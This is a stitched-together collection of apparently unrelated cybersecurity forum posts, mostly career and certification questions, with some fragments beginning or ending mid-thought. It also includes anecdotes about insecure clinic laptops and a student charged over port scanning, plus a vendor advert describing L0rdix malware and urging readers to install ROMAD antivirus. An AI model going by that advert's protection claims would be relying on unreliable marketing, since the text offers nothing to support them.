For a multitude of reasons, I'm ready to leave and was advised by a good friend to look into Cybersecurity. My thought would be to start with a focus on healthcare cybersecurity. I have a degree in rhetoric (the art of persuasion) from UC Berkeley and 5 years of B2B sales experience with Japanese companies (I'm bilingual Japanese-English). I graduated college late and sort of fell into the industry after an unsuccessful job hunt for non-sales marketing jobs. At this point, I love doing sales, but I'm tired of the industry that I'm in for the following reasons: 1. **Not rewarded based on performance.** Every job I've had has been on salary and no matter how high my numbers have been, I don't see a dime more (maybe a slightly higher bonus, but nothing worth the amount of time I put into the job). Because I'm always working on the Asian based accounts, I work 80 hours per week and make the same as most of my co-workers that work 40-50 hours per week on the domestic roles. 2. **Location.** I'm unmarried. Every location in manufacturing is usually stuck in the middle of nowhere. While I don't mind being in low COL areas, a single guy that makes 100k should have more choices than I do, but I don't because I live in a place where people get married young and the culture is just too different. Mind you, I'm not the most liberal person in the world, but I don't ever want to get married. I've been asked about marriage within the first week of meeting a person here more than once. Also, I'm originally from Los Angeles and miss the sun. I'm okay with not going back to LA, but I definitely prefer warm over cold climates. I live in Detroit now. I'm thinking of going to Las Vegas or back to California. 3. 4. **Lack of growth potential.** Anyone in this industry knows that it's shrinking not growing although we've had some recent record years. Everyone is running leaner and the workload is getting unsustainable. 5. **Lack of interest in the product.** Selling robots were cool, but the pay was low. I make more money selling less complex products and it's not very engaging. I spend most of my time managing projects and now mentoring. Cybersecurity is definitely something I have a personal stake in so for that alone, I'd like to learn more about the field even if I couldn't sell it. &amp;#x200B; Questions to the subreddit: 1. Is it possible to pivot to cybersecurity sales with a degree in rhetoric and no industry experience? 2. Are certs necessary for a sales role? I think it would help with product knowledge, but some companies train you like mine has so I'd like to get opinions from those in the industry. 3. My understanding is that this is a certification heavy field. What certs if any would you recommend for someone that is targeting a sales role? 4. Any conferences you would recommend where I could network with professionals in the industry? Specifically sales professionals if possible. 5. Tech has an image of age discrimination, but I don't get this vibe from cybersecurity. Can anyone confirm regarding this area? 6. Any other advice on how to break in as a sales rep in this industry? &amp;#x200B; Thanks in advance"

That being said, here are my questions: 1. What would be the best progression of certifications, given my background and failed attempts at the Security+? Do I have the right idea in terms of certifications to get? I've been told that the CCENT is the best to go for in terms of starter certs but I'd really like some other input before I commit to studying. 2. I'm currently looking towards breaking into the field maybe in a help-desk role and then going for a Sec. Analyst position at some point (after schooling, of course). Is there any material I could use to self-learn in order to gain a grasp on I.T. fundamentals and perhaps what I would be looking at doing in a help-desk role? 3. Would any of you recommend internships? I'm currently taking community college courses and working part-time, but maybe getting some actual hands-on experience could help. On that note, are there any security blogs/social media accounts I could follow to really start to understand how exactly to break into this field?

I use Ditto for tracking copy pasted stuff and it shows me when anything is copied to clipboard but I need something for tracking basically all keyboard or other pc inputs or actions while my pc is on. So something like a keylogging software for my own pc or anything you can think of that tracks actions and stuff on a desktop. Last night for example I am trying to figure out how somebody got on my pc and got into my paypal and I can see some email addresses they tried to copy paste. I am not sure if it tracks remote in clients if they copy or paste something on my pc or just stuff from my physical location but am looking for any software that I can keylog or monitor all things typed clicked and basically get a map of everything I do on my pc alone. For example if I get remote hacked in I want to be able to at least trace and track all the actions and keypresses they did while on my pc etc. I have strengthened up my computer and added a password for my pc which I was hoping I did not need to do as I am prone to forgetting passwords and would not know how to get my windows password back without maybe needing another windows cd or something. TL;DR any good software recommendations for keylogging or action monitoring/recording myself short of recording my desktop 24/7 which I have accidentally done before using nvidia screen recording software and yeah that ended up being 1 TB of data lol. I will be maybe setting up a wifi camera in future but honestly am hesitant to put any cameras in my room as well hackers could theoretically get into that and then have video footage of me which is even worse.

Despite having SOME experience, albeit not professional, I can't seem to beat any damn ATS and at least get an interview, phone or otherwise... I know I can shine if I can get in front of a recruiter/gatekeeper. I guess TL;DR is how does someone with passion for the industry even get in if they can't get past stage one for any particular reason?"

Should I accept a guaranteed security analyst internship or take my chance with a big4 accounting firm to be a cybersecurity consultant? My long-term goal is to become a security architect &amp;#x200B; Hi guys. First post on this sub. &amp;#x200B; I'm a 4th year Bachelor of Commerce student concentrating in Business Technology Management (new Mgmt Info Systems). I believe BComm is the equivalent of BBA in the US. Last summer, I had a chance to work as a summer **IT security analyst** for my university's IT department. It was my first time being exposed to cybersecurity and I really liked the work I was doing. For the last few months, I've been looking into jobs in the cybersecurity field for my next internship (this upcoming summer is my last summer as a uni student since I'll be graduating in April 2020). My search was unfruitful as most cybersecurity internships I found are out in Vancouver or Toronto area. I'm in Alberta. &amp;#x200B; I've been talking with my former boss at the University's IT department, and he sent out my resumes to some of the people he knew, so obviously I was grateful for that. He suggested that if I can't find a summer job elsewhere, I can come back for a 2nd term. &amp;#x200B; A few weeks ago, I spoke with a campus recruiter from a big4 (EY, Deloitte, KPMG, PwC) when they came by my university for an employer info session. At the time they said they weren't looking for technology students, but then a couple of days later, a **cybersecurity consultant intern** position became available. I reached out to the recruiter I met on Linkedin, and she referred me to the hiring manager of the job. By this point, I submitted my application (cover letter, resume, transcripts). A few days later, the hiring manager reached out to me and after exchanging a couple of emails, she suggested that I meet with their head of cybersecurity consulting department. She said it'll be a coffee chat (did not say or mention it was an interview ), but I assume she has checked my resume by this point and wants to bring me in to see what I'm about. I'll be going to their office next Monday. &amp;#x200B; Earlier today, my former boss emailed me asking if I'm still interested in coming back and to let him know by tomorrow. &amp;#x200B; I'm in a big dilemma here as I'm wondering if I should accept the guaranteed internship at the University instead of gambling on myself and hope for the best with the big4 internship. One part of me says I should take what's right in front of me, but another part of me says I should explore and try to build my network. &amp;#x200B; The program that I'm studying at the University is essentially training me to become a business / systems analyst or an IT project manager. Some of the stuff I've learned so far is database management (SQL), enterprise analysis (like drawing use case, activity, business process, state machine, communication diagrams etc) and such. &amp;#x200B; My dream is to become a security architect, and I'm aware that these are two routes I can take to get there. One is being a security analyst (more technical) or security consultant (more managerial, risk governance stuff). Another thing to consider is that I'm a business student, so I don't have the technical skills an engineering or computer science student would. To make up for it, I'm planning to get CompTIA Network+ and Security+ certs soon. &amp;#x200B; Sorry for the really long post, I'm in a weird situation and would love to hear some feedback from professionals. What should I do?"

Problem is my former &amp; soon-to-be-again boss is my most important reference. What should I do? &amp;#x200B; Hi everyone, Last summer, I worked as a summer IT intern for my university's IT Architecture &amp; Security department and split my time working for both the architecture (drawing network diagrams, making RFP templates) and security teams. It was my first time doing security work (Using whois to find IP, MAC, using ServiceNow ticketing system, Trend Micro DDI, etc.) I had a great time and I am now in pursuit of a career in cybersecurity. &amp;#x200B; 2 weeks ago I got an offer from the same department for a 2nd internship this summer, but this time as a summer security analyst, and I accepted the offer this Monday. &amp;#x200B; Yesterday, I got an email from Schneider Electric (applied for their security intern job 5 months ago) asking if I would be interested in moving to Montreal for a summer internship (I'm in Alberta, Canada) before they proceed with an interview. I felt the timing was off so I politely declined. If they had emailed a bit earlier, I would have LOVED to pursue this internship. And then today, I got an email from a major Oil &amp; Gas company (applied for an IT project intern job 3 months ago) asking if I would be interested in a security internship. &amp;#x200B; I had a great time learning about cybersecurity last summer, but the university internship is definitely the lowest paying job. ***My dilemma is since I already accepted the university's internship offer, is it wrong for me to follow up with the O&amp;G company's interview?*** **My former &amp; soon-to-be-again boss (at the uni IT department) is my most important reference for my resume.** Many students applied for this job, but he personally reached out to see if I would be interested in coming back. And I said yes, so he probably didn't even interview anyone. I have this sense of loyalty to him too because he was very kind and patient with me as he answered all my nagging questions and as I learned the ropes of being in a professional environment for the first time. I would hate to burn the bridge with him. But the fact that I'm being approached by companies I wanted to work for has got me thinking... &amp;#x200B; I will be graduating next year so this summer is my last internship. **My main reason for wanting to pursue this O&amp;G internship is... I think if they liked me enough and I performed well, maybe just maybe there is a chance that they will offer me a FT position when I graduate.** I'm a business student so I don't have the technical skills a comp-sci or an engineering student would. I plan to get cybersecurity certs but they can be costly as you guys may know. I heard that most O&amp;G companies in my area will pay for certs as long as I remain with the company, so I'm tryna think what would be the most beneficial for my career. But like I said, my former boss at the Uni is my most important reference and he is also the hiring manager for the uni internship. &amp;#x200B; Any feedback is appreciated!"

But during the interview, I found out that this job is dealing with **SAP security**, not **IT security.** &amp;#x200B; From my understanding, since SAP is a software, would this be considered application security...? and my previous internship is IT infrastructure security? &amp;#x200B; They vaguely told me about the kind of tasks I will be doing, but I still don't have a full detailed list of tasks, so I'm going to request a full job description before I decide to accept their offer.

Bit of background here: I work at one of the largest retail computer repair companies in the US. Have been working there to save money to pay for certification tests. Have a few under my belt, next one up is CISSP or some Cisco ones. &amp;#x200B; So, just a regular day working as usual. A client comes in with two OLD XP laptops, not an uncommon thing for where I work, our clientele loves to cling to ancient tech. She is having general software issues all of which are not important. As I was sitting there with the client listening to the issues and trying to determine the cause of them and how to go about fixing them, I notice she is wearing scrubs with a logo that I recognize. I make some small talk and ask ""So are you a doctor?"" She says ""Yes, I am a nurse for Dr. \*\*\*\*\*\*\*'s practice"" I laugh and reply ""Oh, what a small world, that's my doctor!"" Continuing in my slight chuckle, I say ""These aren't your work computers are they?"" She says, ""Yes, these are two of our computers from the clinic"". This is when I immediately cringe. I reply, ""Wait, so these are your office computers? Like you use them to write prescriptions and view patient records?"". She nods slightly confused. I say, ""So just to be clear, you are storing confidential patient records on a system that is roughly 15+ years old"" She says ""Uhm, yeah they still work, why is that a problem?"" I start to get audibly frustrated and reply ""Because these systems are running Windows XP. That is EOL, meaning they are no longer supported by Microsoft. They no longer get security updates. They have known security flaws and exploits that have been publicly posted on the internet!"" She then replies, ""Yeah I know they are old... but Dr. \*\*\*\*\*\* doesn't like to replace things if they still work."" I then say very sternly, ""That's not the point, sure they still turn on, but they are completely insecure. Like I said before, WinXP has several exploits, meaning you might as well store patient records in an unlocked filing cabinet on the side of the road. You need A NEW COMPUTER."" She nods again and says something again like ""Yeah, I wish we could get new ones but Dr. \*\*\*\*\* just won't go for it"" I finished up the conversation after fixing the small software issues and said very calmly. ""There is no excuse to be storing sensitive information on a vulnerable system like this. I guarantee the cost of a few upgrades to your equipment and infrastructure will be nothing compared to the inevitable law suit. Not to mention I know how much that doctor charges for a visit, trust me, he can afford to upgrade, especially since he has had nearly 15 years to save up. Here is my card, I am happy to help, feel free to contact me whenever."" I am completely flabbergasted at this point. Just pure ignorance here. I don't expect the nurses to know this sort of stuff, I don't even expect the doctor themselves to know. But isn't there some sort of law that requires anyone with a medical license or seeing patients to be audited to make sure their stuff is secure? I just don't get it. This doctor is storing mine, and several hundred other people's medical records on WindowsXP machines! Not to mention that he makes his nurses take company computers to a retail computer repair shop. When the nurse brought the computers in they still had the clinic management or whatever it was program open and running. I literally SAW patient names, appointments, everything. I obviously minimized it because it wasn't relevant to the computer problem, but that nurse came into the store, sat down, connected to a random free wifi.... like I don't even have anything more to say, except how can people let this happen?! There has to be some law, something that violates HIPPA... Anyway, the reason I am writing this post is basically to share other people's ignorance to cybersecurity, but more so see how some others would have handled the situation? "

I thought Id share my story here as I was in the same boat as a lot of you two years ago (no relevant degree/certs, no real IT experience, vague idea of security, lots of discouragement from negative people on forums, etc.) I had a Bachelors degree in philosophy and about 3 years of job experience doing technical writing, operations management, and other roles but I knew that I wanted to go into IT. I decided to apply for a Masters in Information Systems Operations Management to get that technical skillset/street cred. Towards the end of my degree I pretty much had my sights set on security. I loved the classes and it just seemed like a badass field (hacking, secrets, cryptography, etc.) so I decided to dedicate the next year and a half to making myself the ideal candidate for a security position. As my first step, I applied for a desktop support role at the university I was studying at and got the job. Heres what factored into that: -the nature of my degree -even though my most recent role was not officially IT related, I helped on a ton of IT projects and pushed that as much as I could in the interview -tried to push the fact that even though I did not have an extremely intensive IT background, I had a lot of customer service/people skills which is invaluable in a desktop support environment when dealing with difficult situations/people -researched desktop support interview questions and just general good interview preparation (the fact that I was a student in the university which the job was held did not factor into me getting the job so dont be discouraged about that. The hiring manager didnt know I attended school until my first day of work). From my literal first day, after meeting anybody with a vaguely IT related role I would ask do you do anything security related?. From there, I got bits and pieces from everybody as time went on and learned about security from an actual IT environment. I cannot overestimate how much this helped my understanding of security. This extra step is what will make the most of your desktop support role. After a few months on the job, I delved into a bunch of security projects at home. I started watching Security+ cert training videos and built a home lab. I made my own pentesting kit with a small pi kit and made my own personal VPN using Amazon Web Services / Google Cloud platform. At this point, I just start applying like crazy. DevOps, IT Architect, SysAdmin, Security Analyst etc. I used Linkedin, monster, indeed, my own university, etc. I made sure to have my linkedin profile looking as best as I could, making sure my settings were open to recruiters, adding my skills and hounding my friends to endorse my skills if they had seen me use them in class or on personal projects. A few months into applying a recruiter contacted me about a Security Analyst role. I learned as much as I possibly could about the company, researched their employees on linkedin, and read every kind of relevant security interview preparation that I could find online. I made it through the rounds and got the offer. They loved the fact that I had a homelab (you should check out that subreddit by the way, /r/homelab its awesome) and they actually outright asked do you have a homelab which I thought was crazy. It gave me something tangible to talk about and showed that I was clearly interested in security. The homelab was also a great way to learn about basic networking concepts which is ESSENTIAL to security. Also, all the probing I did at worked helped me talk about my desktop support experience like it was a security job. Ive found the title doesnt matter as much as the experiences you can talk about from that position. The security+ videos helped a lot too. Even though I never went and got the certification, watching the videos helped me understand basic security and totally helped me get through the interview process. (The best youtube channel to practice for security+ is Professor Messer. His guides for all IT certs are free, quick, informative, and just all around awesome.) So yeah, all of the above took a long time, but definitely worth it. I am by no means an expert in cybersecurity, but I literally just made small progress every week which really accumulated over a year and a half. Im happy to answer any questions and honestly, Im just here to say that you can do it too!"

I've always known that I want to go into some sort of computer science field as my profession, and after discovering jobs such as Penetration Testing, Security Analysist, and other similar ones, I've decided this is the field I want to go into. I think a decent majority of you will be able to help me with questions 1/2, maybe a couple for question 3, and if I'm lucky, at least 1 person will be able to help with question 4. So without furthur ado, my main 4 questions about this profession/college. Question 1: Answer if you understand Cyber Security Certifications/Degrees, their role in the industry, and what jobs need what certifications/degrees. The two specific jobs in cyber security that interest me the most are Penetration Testing and Security Anaysist. I've heard from some that certifications are more important in this field compared to others, where in other fields, most weight is put into whether you have a degree or not. My questions are this: If one wanted to pursue a career in penetration testing, what specific certification(s) would you need? [Same question for a security analysist as well] Also, which one matters more: Certifications, or Degrees? Question 2: Answer if you've gone to college for Cyber Security After doing some research for certain colleges, I've discovered that Whatcom Community College, the community college in the same town I live in (!) has a very good cyber security program. Whatcom Community College was designated by the National Security Agency (NSA) and the Department of Homeland Security as a National Center of Academic Excellence in Information Assurance/Cyber Defense 2-year education (CAE2Y) in 2014. These are the Certifications/Degrees that WCC has to offer Bachelor Degree Bachelor of Applied Science (BAS) - IT Networking - Cybersecurity Associate Degrees Associate in Science (AS) - Computer Information Systems Associate in Applied Science-Transfer (AAS-T) - Cybersecurity Certificates Computer Information Systems - Network Administration Computer Information Systems - Technical Support Certificate Of Proficiency Information Security Professional My question is this: Do you suggest WCC as a good pathway for starting off in the cyber security field? And if so, which one(s) of their offered Certifications/Degrees do you suggest pursuing? [Note: I am not opposed to more schooling after 2 years of community college if it means something like completing another certification that is highly recommended for future jobs] Keep in mind, I would like to be a Penetration Tester as my ideal career, but I'm open to other professions within cyber security if any of you want to enlighten me. Question 3: Answer if you attended Whatcom Community College specifically This is sort of a simple one if you did attend. Would you guys suggest going to school here? Any big pros/cons of the school? Any specific professors to take classes from/avoid? Question 4: Answer if you attended Whatcom Community College for 2 years, and did a continuation for years 3 and 4 at Western Washington University I don't expect any of you to meet the criteria of this question, but I'll ask it anyways. I've heard from some that the classes at WCC don't prepare you for the continuation courses at WWU. The courses at WWU expect you to know more than WCC teaches you, despite the two colleges having a partnership where WCC students can easily transfer over to WWU and their cyber security program. My question is: Did you find this to be the case? And if so, how would you suggest that I over come this hurdle, or even if it's worth overcoming at all. Thank you very much for reading and helping if you can  Even if you can only answer one of these, it'll be a big help!"

He's currently the CEO of ShieldX, a cloud security startup with $30M+ in funding and 50+ employees. Here are some excerpts from the interview about sentiment and IoT from a cybersecurity perspective. &amp;#x200B; **Vishal:** \[OP\] And as someone who's on the forefront of the security space, what are the biggest challenges the security market will have to face, especially when it comes to government hacking? &amp;#x200B; **Ratinder:** Correct. Yeah. So this is a never ending trend. It'll never go away. And you can sort of go back to the earliest days of bank robbers to fast forward all the way to now. So I think the mechanisms of attacks will change, just because where your assets are placed, change. Or, what you value has changed. &amp;#x200B; **Ratinder:** So, today for example your privacy, is almost as valuable as your money. So this concept didn't exist 20 years ago. Nobody thought that I could take your personal data and somehow monetize it. So, and over time there will be other assets that are equally important. For example, sentiment, who would have thought sentiment would be a valuable asset? But as you can see from the election hacking concepts that have been talked about, that if I can change your way of thinking, then I can have an outcome right? So this is security to us too. I mean who would have thought that changing the way you think is a security issue? &amp;#x200B; **Ratinder:** And of course then you can go towards hard assets of computers and those are the classical issues anyway. If you look at how you will be using computer going forward, you will be thinking about more variable devices. Right? You'll be thinking of artificial reality. You'll be thinking of self-driving cars. There will be more automation in your life. And every one of those is a potential target. So you can see as some of these trends take shape, as you start using virtual reality in your day and day work, you can imagine the kind of threats that, that might create. &amp;#x200B; **Ratinder:** So that's how the security market will evolve because it's simply tracking the other trends that are taking shape. &amp;#x200B; **Vishal:** Absolutely. Either a significant portion or the majority of all IoT devices on the market right now, have already been compromised or hacked. So, as you're saying as we get more autonomous and connected, how would we even begin to tackle something like that from a security sense. &amp;#x200B; **Ratinder:** Yeah. Right and IoT is interesting one because, here you have a concept of the supply chain. So, these IoT devices are built all over the world. The components come from all over the world. They get a sample somewhere. Software gets written somewhere else. So you can see there's a big supply chain integrity problem. And this will get exploited. It already has been exploited. You heard of cameras being compromised. They all had a simple password and then, once these cameras were everywhere, hackers got into them and turned them into a 'bot army'. So meaning, each camera can be now used to spy and create traffic and all kinds of things. So you can turn it in to a traffic bot, deny service, flood the links. &amp;#x200B; **Vishal:** Oh, so they have control over the traffic signals as well? &amp;#x200B; **Ratinder:** Yeah. As well, right. So, and this is a new phenomenon, because only recently have these small cameras become so cheap and twenty dollars you can buy a camera. And now they're everywhere right? Every house will have 10 of these things. &amp;#x200B; **Ratinder:** And the supply chain of those is not understood. Who built them, who wrote the software for it. &amp;#x200B; **Ratinder:** So this is a problem because you as a consumer are gravitating towards cost. So you, you know, say hey, this is 20 dollars, this is 100 dollars, I'm gonna get the 20 dollar one. And you're not paying attention to any supply chain issues with that. &amp;#x200B; Original Video at: [URL"

Eg team of 15 vs another team of 15 cyber experts who would compete against each other in the game. The offense team would use penetration tactics against the defense team who would spin up a server and harden it. The offense team would have a certain amount of time to try and retrieve a text file that contains a phrase that only the defense knows. Then after the time is up they switch places (offense team becomes defense and defense team becomes offense) and then a new server is spun up and a new time limit given etc. What kinds of metrics would be used to gauge the scoring of points? What would be the default type of platform or should it be dynamic and have different types of servers? How to make it entertaining for spectators? Rules etc? "

I find this field very attractive both in terms of sheer interest and lucrative business opportunities. Now I don't have a cybersec background or work experience, I am rather a self-learner. I don't intend to work in this field as in for some employer (it would take me ages to get certs and prove my value to employer) but I really need to get a deeper insight into the problems of this industry that are worth solving and that have the potential to grow into a company. Without detailed and first-hand experience, it could prove a bit challenging to identify a business opportunity. So I was thinking about going down a rabbit hole and doing the things the lean startup way. I'd like to first identify a good problem and then start crafting solutions. &amp;#x200B; So my questions are two-fold: 1)Are you willing to share here some of the struggles that you experience as cybersec professional on a daily basis? What needs improvement that would be useful enough for the company that they would be willing to pay? AFAIK, the cybersec industry is very prone to burnout because you gotta be on call 24/7 (depending on your role of course) and there are issues with under-staffing. So I assume that solutions/tools that would reduce the workload could be of use. I recently read about [browser isolation](URL and it sounds like quite an interesting concept to toy with in order to substantially reduce workload of cybersec professionals. I've also heard that proper access controls solutions usually have the highest ROI for the company. 2)If I were to schedule some interviews by cold-calling companies and inviting cybersec professionals to come to an interview, how opposed would they be of that idea (speaking from your personal perspective)? In general, I know that people are more or less willing to be interviewed, but cybersec is a bit different because of confidentiality and obscurity measures (well, I mean why should you trust some outsider to tell him about your struggles, he may as well be a perpetrator that tries to leverage any information you hand out to him). Is it even a realistic to hope for interviews? What kind of approach would instill greater trust in you that you would be willing to accept an interview?

A small excursion into history. I'm working as Security Analyst more than one year. My first startup company which introduced me to the field of cybersecurity - once tried to build SOC. We were small student-enthusiasts who did not know how, but wanted to build SOC. We even had a client! But the lack of experience and no understanding of how to build processes played a role. At one point I was disappointed that we would build something adequate with our experience and I decided to try myself in another company which already have successful SOC to get experience. &amp;#x200B; But I got another disappointment. Maybe because of my misunderstanding of how should look a security analyst work. &amp;#x200B; My default day in SOC: \- all the day you handle the tickets in your service desk and in parallel you need to do another tasks that give to you your manager; \- 99% of tickets is false-positive that no one tried to reduce; \- 99% is default SIEM rules without tuning; \- making monthly reports where you put the same information from previous month, because customer doesn't want to fix his problem. In 79% times customer just ignoring you and I even not sure that he reading reports, but you spend enough time to write that report; \- no one give a fuck how to make investigation. Mostly investigation is to type in google ""blacklist IP x.x.x.x."" or ""for which this Windows process responds?""; \- help customer to configure his security solution; \- as such processes how to response to the attack or suspicious activity - nope; &amp;#x200B; All time I think that we will miss a real attack.

I don't know if this is the same for all of you but for me, I was a lost 14-year-old black boy who barely understood HTML and made websites in WIX. Looking back I was ambitious to become a ""security researcher"" and dip my hands into this new field of technology, so eager to try out new things. As a novice looking for new ways to hone my talents, I often found myself getting into trouble. I would poke around systems and get the attention of the school's IT team who wasn't as ambitious and excited as I was. One day the school got fed up with me and I was suspended for port scanning and slowing down the school's network, but upon my return, the vice principal gave me a choice that I will never forget. He told me I could ""use my powers for good"" and inform him of any vulnerabilities I found on their systems, I was finally given the chance to use my skills productively in a way that helped others. Right? Now I am 18, I have been forced out of my school, disconnected from my peers and am facing criminal charges for Computer Tampering. So what happened? What happened is a problem I see A LOT when it comes to youth in cybersecurity and I feel like it needs to be discussed. You see at the time, the vice principal had used his offer as a way for me to incriminate myself through signature despite already serving my punishment and not being of legal age to sign documents. Because I could not be expelled (my IEP protects me), the school used both my mental health and ""technology issues"" as a ""scapegoat"" to get me transferred out to a therapeutic school (which did not end up working out), what's worse is I am facing multiple punishments for doing something as harmless as helping the school after I was ASKED (or tricked) into doing so. All of this didn't help my mental health. I spiraled down a deep depression and then got admitted to an inpatient facility for suicidal ideation twice within a months time only to come back to the police charging me with something the school already punished me for several times. What's funny is everything seems to be getting worse. Since I have no friends I find it easier to get into trouble. I have picked up really bad habits and stopped eating, I have become skinny and sulky and worst of all lost much of my motivation to ever want to do anything sort of offensive-security work in the future, I feel betrayed. This is something that I see happening a lot in the cybersecurity community, especially amongst the youth. There is this criminalization for curiosity and it scares hackers away from cybersecurity. There is no reason why I should be sitting here alone at 1:44 PM when I am supposed to be at school interacting with my peers. What is even more frustrating is the fact that my school has actual trouble to worry about such as gangs and drug dealer, not some computer nerd, yet they are still attending high school whereas I am not. I have been punished for doing what I was told and have always wanted to do: ""use my powers for good"", but being good only brought me loneliness.

I'm a graduate student completing my MS in Security Technologies right now. The program covers everything from cybersecurity, to management of security technologies and risk communications. I am narrowing down my topics to focus on for my capstone project, which essentially needs to be a real-world professional application of all the concepts we cover, and I wanted to throw out a last minute post to see if there might be any other ideas that interest me before I set my mind on one. The two options that I feel best about right now are centered around doing comprehensive security risk assessments for either public schools or the hospitality industry. I have discussed these topics with my director, and he agrees that they are both viable topics. Public schools are extremely underfunded and behind in the security world and I think I may get a little more out of that path, in that I can include a physical security assessment as well as a cybersecurity risk assessment. However, the recent Marriott breach news and nation-state implications create a relevant option in the hospitality industry as well, I suppose there could still be a physical security element there also. Some other topics I'm hearing in my cohort are things like election security and security risk assessment for a local church. Just wanted to see if anyone has any other ideas that might be good to consider, or even ideas that could support or enhance my current options. Thanks!"

As ROMAD analysts predicted, the less profitable the hidden mining becomes, the more profitable it gets to develop the hybrid malware. The hybrid malware is the one that combines multiple options to steal the digital assets. L0rdix has appeared at the end of 2018. It is all-in-one, new Swiss army knife for the cybercrooks. L0rdix is able to do the hidden mining, participate in DDoS attacks and install the 3rd party malware that looks for even more user data such as credit cards numbers and cryptoassets or for sending spam. L0rdix is able to infect the USB drives thus it has the worm abilities. This is a professionally written piece of the software. It is not only for the own usage, but also for reselling. ROMAD analysts thinks this solution may have a wide use like Zeus Trojan in the past. Currently many classic antiviruses are not able to combat this threat efficiently due to a high obfuscation. However, the next generation antivirus ROMAD is able to protect its users from the modern malware. Do not put yourself to risk. Install free next generation ROMAD antivirus and be protected."

I've been reading a lot about it in order to plan ahead. My goal is to get a job in cybersecurity in 5 years and be competent enough to do it well. **College** I am going to college to get a degree. I've read time and time again how computer science is the best degree one can get for cybersecurity. I honestly feel I'd struggle to perform in computer science. I've worked on some low level programming projects on my own and I'm just not good at coding and I have an eye disorder which slows me down further. The only school I can afford to go to offers Information Systems and does not offer Information Technology unfortunately. I figured having a Bachelor's in Information Systems would at least add some credibility to a future resume. **Experience** While I'm pursuing a Bachelor's in Information Systems I want to get some certifications under my belt. My strategy is to use said certifications to land an entry level technology job in order to gain experience. Then I figure with several years of IT experience, a Bachelor's in a technologyish degree and certifications will put me in a decent position to get some interviews in cybersecurity. **Certifications** The initial certifications I'm interested in getting are: Comptia A+, Cisco CCENT, Comptia Security+ Then I will work on a few harder Security certifications and possibly a harder Cisco certication I figure after obtaining those I can expand into Vmware, Cloud, possibly Linux and Microsoft Overall, my strategy is to provide the base essentials of landing a job, namely job experience in a related field and a bachelor's in tech. The crux of this plan is to make up for the lack of significant experience and lack of a computer science degree with a bitchload of certifications. I don't know how hard the certifications are, but I figure they will teach me a lot while helping build a resume.

I've run into a bit of a dead end when trying to decide what sort of coding projects to work on to build up my portfolio. I'm a self-taught programmer now with five years professional experience in automation development as well as some data analytics. I love coding and have recently also fostered a love for cybersecurity as well, resulting in my currently earning a degree in cybersecurity. I often hear that this is overkill but as a self-taught programmer without any degree wanting to learn cybersecurity in depth, I figured it was a two birds - one stone scenario. &amp;#x200B; My question, as I'm nearing graduation, is that as I put together a portfolio with a goal of demonstrating both my programming ability as well as my knowledge of security, is what should I build? I've really come up pretty blank for good ideas. Is there a common software need in the cybersecurity field? Should I create my own version of common security applications such as a very light version of anti-virus software? I should note that my desired jobs would be really anything you'd get if you were to search 'security programmer / developer jobs.' As I said, I love coding but I'd like to have a position where security if constantly kept in mind and secure strategies are implemented when planning the development process. As a group with probably a much better understanding of these types of positions than myself: what would impress you in a portfolio as someone in charge of hiring for a position like this? Cheers!"

I chose to get my Masters because I didnt want to get a second bachelors and I am doing great in my courses and am in pace to graduate on time. I was wondering as to what my next steps should be? I think that I could start studying for some of the easier certs such as network+ and security+. Get those before graduation and maybe another, but wanted to see what everyone one here had to say. I know that experience is obviously really important so Id love to try and get an entry level job or internship before I graduate with my Masters. I would love any advice as to what I should be focusing on next. Also, let me know what your thoughts are about my decision to get my Masters in Cybersecurity even though my undergrad was in Business Administration. "

This is a threat to the privacy and creates a risk of security breach in the cloud network. Most of the industries deploying IoT contain valuable information which, if breached, could result in serious reputation loss for the cloud provider and the company. One of the major attacks on IoT networks is due to insecure network services. This would allow intruders to obtain unauthorised access data stored in IoT devices and lead to attacks like Denial-of-Service. Another [cyber-attack](URL possibility arises when data is shared among IoT devices without encryption. Intruders could sniff the data and could capture the data transmitted from one device to another. Insecurity in the web interfaces built into IoT devices could also lead to cyberattacks. An intruder can gain easy access of the IoT device through a weakly protected and designed web interface. It could also lead to issues such as SQL-injection and Cross-site scripting (XSS). **Conclusion** As IoT technologies and adoption level increases the possibilities of cyber threats also increases. One major challenge in curbing cyber-attacks is the lack of cyber-attack reporting by companies for fear of loss of reputation. Companies can curb cyberattack by ensuring that the data is encrypted using standards/protocols such as SSL and TLS. Another way to counter cyber attacks is to avoid using proprietary encryption protocols. This is because protocols such as SSL and TLS are tested and secured by several group of people and is more secure compared to a proprietary standard. Another way of securing the account is to avoid using default passwords and usernames across IoT networks. IT administrators should make sure that weaker passwords are not input in the system.

I also know how most breaches occur from internal failures from negligence, Navety , or pure ignorance. Now, I am looking for yours. The stories I am looking for are ones that I can spin into an educational message but also reveal reality. Here are some examples of stories - \- Arguing with the Chief Architecture Officer that internally across 3,000+ databases, active directory and hundreds of internal web applications in a Fortune 100 company has zero SSL deployed. The reason, the CAO said it caused too much overhead on performance and they were behind the firewall. \- Arguing with a Director on a project who came up with an idea, that almost went forward, to send all the internal Active Directory passwords to a 3rd party company in case the Siteminder Federation authentication broke, the users could login directly at the 3rd party with their internal credentials. Nightly feed to the client, all internal accounts, clear passwords. (this one actually made it to a project decision step) \- Simply discovering a breach, covering it up internally and telling no one during the fix. &amp;#x200B; Those are the reality shocks I'd like to hear. Fully, 100% anonymous. No names, no companies or descriptions that would identify the company. Any names of people submitted I'll change anyway. Send them to [bblogger@protonmail.com](mailto:bblogger@protonmail.com) and maybe if they are legit sounding enough I'll get enough to do an episode series on them.

This is just my suggestion after 13 years in industry. You Do You. &amp;#x200B; So many people on here ask these questions. * Where should I Start? * Should I go into Cybersecurity? * Should I major in Cybersecurity? * I want to be a hacker, how can I do that? * And, others I feel like when I see people saying ""I want to be in cybersecurity,"" what they are really saying is ""I want to be a hacker."" That's fine and all, but cybersecurity is WAY more than being a hacker, and that's the point of this post. **My Background** I am not ""in cybersecurity"" by education. I am an electrical engineer with over 10 years experience in avionics embedded systems engineering including software, firmware, and unit-&gt;system level testing, to include flight testing. I've enjoyed so much the engineering side of my career, and honestly I miss it sometimes. At one point, it became apparent that ""we"" weren't ""doing cybersecurity"", and that it was a a big problem. (Note: I'm keeping details extremely vague on purpose) The most common thought with most of the engineers around me was ""cybersecurity isn't that big of a deal in our industry,"" and quite frankly I agreed. So when my leadership saw an eager engineer who is always looking for a challenge and willing to self-improve to meet any challenge head on, they volun-told me to get ""cyber smart."" About a week later I was told I was registered for a Certified Secure Software Lifecycle Professional (CSSLP) bootcamp, and about 2 months later I was certified (Praise the Lord!!! That test was HARD!) &amp;#x200B; Anywho, so here I am, a certified Cyber professional with less than 6 months experience ACTUALLY focusing on 